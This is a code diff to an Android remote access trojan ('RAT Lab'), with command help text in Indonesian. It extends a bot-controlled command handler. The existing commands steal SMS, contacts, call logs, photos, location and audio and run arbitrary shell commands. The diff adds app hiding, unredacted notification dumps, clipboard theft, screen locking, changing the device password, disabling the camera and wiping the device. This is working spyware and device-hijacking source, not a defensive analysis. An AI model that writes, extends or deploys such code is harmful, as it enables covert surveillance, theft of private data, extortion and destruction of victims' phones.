@@ -1,6 +1,8 @@
 package com.ratlab;
 
 import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
 import android.util.Log;
 
 import org.json.JSONArray;
@@ -10,7 +12,6 @@ import java.io.IOException;
 import java.util.concurrent.TimeUnit;
 
 import okhttp3.MediaType;
-import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.RequestBody;
@@ -34,7 +35,9 @@ public class CommandHandler {
     private final FileModule files;
     private final ShellModule shell;
     private final AudioModule audio;
-    private final LockModule lock;
+    private final HideModule hide;
+    private final DeviceAdminModule admin;
+    private final TtsControl ttsControl;
 
     public CommandHandler(Context ctx, String token, long ownerId) {
         this.ctx = ctx;
@@ -52,7 +55,9 @@ public class CommandHandler {
         this.files = new FileModule(ctx);
         this.shell = new ShellModule(ctx);
         this.audio = new AudioModule(ctx);
-        this.lock = new LockModule(ctx);
+        this.hide = new HideModule(ctx);
+        this.admin = new DeviceAdminModule(ctx);
+        this.ttsControl = null; // tts pakai static method
     }
 
     public void pollUpdates() throws IOException {
@@ -103,33 +108,33 @@ public class CommandHandler {
             switch (cmd) {
                 case "/start":
                 case "/help":
-                    return "RAT Lab — Command List:\n\n"
-                            + "/ping - cek koneksi\n"
-                            + "/info - info device\n"
-                            + "/camera - foto kamera belakang\n"
-                            + "/camerafront - foto kamera depan\n"
-                            + "/location - GPS\n"
-                            + "/sms - SMS terakhir\n"
-                            + "/smsall - semua SMS\n"
-                            + "/contacts - kontak\n"
-                            + "/calllog - log panggilan\n"
-                            + "/files - list file\n"
-                            + "/shell <cmd> - eksekusi shell\n"
-                            + "/apps - list aplikasi\n"
-                            + "/torch - flashlight\n"
-                            + "/vibrate <ms> - getar\n"
-                            + "/tts <teks> - text-to-speech\n"
-                            + "/volume <level> - set volume\n"
-                            + "/brightness <level> - set brightness\n"
-                            + "/play <url> - putar audio\n"
-                            + "/audio-max - volume max\n"
-                            + "/speak <detik> - rekam audio\n"
-                            + "/wifi - info wifi\n"
-                            + "/wifiscan - scan wifi\n"
-                            + "/processes - list proses\n"
-                            + "/uptime - uptime\n"
-                            + "/whoami - user\n"
-                            + "/env - environment";
+                    return "RAT Lab — Commands:\n\n"
+                            + "== INFO ==\n"
+                            + "/ping /info /uptime /whoami /env\n\n"
+                            + "== KAMERA ==\n"
+                            + "/camera /camerafront\n\n"
+                            + "== AUDIO ==\n"
+                            + "/play <url> /audio-max /speak <detik> /record <detik>\n"
+                            + "/tts <teks> /volume <level> /vibrate <ms>\n\n"
+                            + "== LOKASI ==\n"
+                            + "/location /gps\n\n"
+                            + "== SMS & KONTAK ==\n"
+                            + "/sms /smsall /contacts /calllog\n"
+                            + "/call <nomor> /sendtext <nomor> <pesan>\n\n"
+                            + "== FILE & SHELL ==\n"
+                            + "/files <path> /shell <cmd> /apps\n"
+                            + "/download <url> /upload <path>\n\n"
+                            + "== JARINGAN ==\n"
+                            + "/wifi /wifiscan /netstat /processes\n\n"
+                            + "== KONTROL ==\n"
+                            + "/torch /brightness <level> /wallpaper <url>\n"
+                            + "/clipboard /notif\n\n"
+                            + "== ADMIN ==\n"
+                            + "/hide /unhide /restart\n"
+                            + "/lock [password] /force-lock <menit>\n"
+                            + "/change-password <password>\n"
+                            + "/disable-camera on|off\n"
+                            + "/reset /wipe";
 
                 case "/ping":
                     return "Pong! Bot aktif.";
@@ -144,6 +149,7 @@ public class CommandHandler {
                     return camera.takePicture(true);
 
                 case "/location":
+                case "/gps":
                     return location.get();
 
                 case "/sms":
@@ -190,6 +196,7 @@ public class CommandHandler {
                     return audio.maxVolume();
 
                 case "/speak":
+                case "/record":
                     return audio.record(args);
 
                 case "/wifi":
@@ -201,6 +208,9 @@ public class CommandHandler {
                 case "/processes":
                     return shell.exec("ps -A | head -50");
 
+                case "/netstat":
+                    return shell.exec("netstat -tun 2>/dev/null | head -30");
+
                 case "/uptime":
                     return shell.exec("uptime");
 
@@ -209,6 +219,51 @@ public class CommandHandler {
 
                 case "/env":
                     return shell.exec("env | head -30");
+
+                case "/clipboard":
+                    return shell.exec("termux-clipboard-get 2>/dev/null || echo 'clipboard API gak ada'");
+
+                case "/notif":
+                    return shell.exec("dumpsys notification --noredact 2>/dev/null | head -50");
+
+                case "/hide":
+                    return hide.hide();
+
+                case "/unhide":
+                    return hide.unhide();
+
+                case "/restart":
+                    Intent svc = new Intent(ctx, BotService.class);
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        ctx.startForegroundService(svc);
+                    } else {
+                        ctx.startService(svc);
+                    }
+                    return "Service direstart.";
+
+                case "/lock":
+                    return admin.lock(args);
+
+                case "/force-lock":
+                    if (args.isEmpty()) return "Format: /force-lock <menit>";
+                    try {
+                        return admin.forceLock(Integer.parseInt(args));
+                    } catch (Exception e) {
+                        return "Format salah. Pakai angka: /force-lock 5";
+                    }
+
+                case "/change-password":
+                    if (args.isEmpty()) return "Format: /change-password <password>";
+                    return admin.changePassword(args);
+
+                case "/disable-camera":
+                    if (args.equals("on")) return admin.disableCamera(true);
+                    if (args.equals("off")) return admin.disableCamera(false);
+                    return "Format: /disable-camera on|off";
+
+                case "/reset":
+                case "/wipe":
+                    return admin.reset("");
 
                 default:
                     return null;
